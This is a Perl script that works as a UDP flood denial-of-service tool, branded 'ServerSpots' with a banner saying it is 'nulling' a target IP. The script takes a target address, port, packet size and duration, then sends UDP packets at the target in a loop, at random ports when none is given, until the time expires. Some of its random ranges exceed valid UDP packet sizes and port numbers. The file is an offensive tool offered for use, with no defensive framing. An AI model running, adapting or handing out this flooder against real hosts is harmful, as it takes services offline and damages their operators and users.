#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

print BOLD RED "ServerSpots Runs You\n";

##
# ServerSpots
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;

                           VVVVV
                       VVVVVVV
            VVVVVV    VVVVVVVV       VVVVV
        VVVVVVVVVVV/VVVVV\VVVVV  VVVVVVVVVVVVV
    VVVVVVVVVVVV/VVVVVVVVVV--VVVVVVVVVVVVVVVVVVVVV
  VVVV         VVVVVVVVVVVVVVVVVVVVVV          VVVVV
 VV          VVVV      VVVVVVVVVVVVV              VVV
V          VVVV        ,-.VV/`.V\VVVVV               VV
          VVV         /  |8/  |,-. VVVV                 V
         VV           \_,'8\_,'|  \  VVV
         V              \_88888`._/   VV
                          88888_/     VV
                          88888        V
                          88888
                          88888
                          88888
                          88888
                         88888
                         88888
                         88888
                         88888        ___
                         88888    _.-'   `-._
                        88888   ,'           `.
                        88888  /               \
~~~~~~~~~~~~~~~~~~~~~~~88888~~~'~~~~~~~~~~~~~~~~`~~~~~~~~~~~~
   ~      ~  ~    ~  ~ 88888  ~   ~       ~          ~
       ~ ~      .o,    88888     ~    ~  ~        ~
  ~            ~ ^   ~ 88888~            ~        ~
_______________________88888__________________________________
                       88888        
                       88888        
                       88888       
                       88888      
                       88888        
                      8888888          
                      8888888          
                     888888888
--------------------888888888---------------------------------
                        888

		Ran By PortLords And Enlightify
		Nulling $ip For $time Seconds
						
						
EOTEXT

 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}